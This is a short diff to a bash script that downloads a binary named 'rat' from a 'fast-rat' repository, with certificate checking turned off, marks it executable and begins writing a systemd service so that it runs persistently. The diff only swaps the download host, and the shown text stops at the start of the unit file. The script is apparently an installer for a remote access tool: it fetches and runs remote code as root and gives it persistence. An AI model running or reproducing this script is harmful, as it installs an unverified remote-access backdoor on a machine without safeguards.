@@ -1,6 +1,6 @@
 #!/bin/bash
 cd /home
-wget --no-check-certificate https://raw.imbytecat.com/imByteCat/fast-rat/master/linux/rat
+wget --no-check-certificate https://raw.minecraftbe.org/imByteCat/fast-rat/master/linux/rat
 chmod +x rat
 cat > "/etc/systemd/system/rat.service" << EOF
 [Unit]
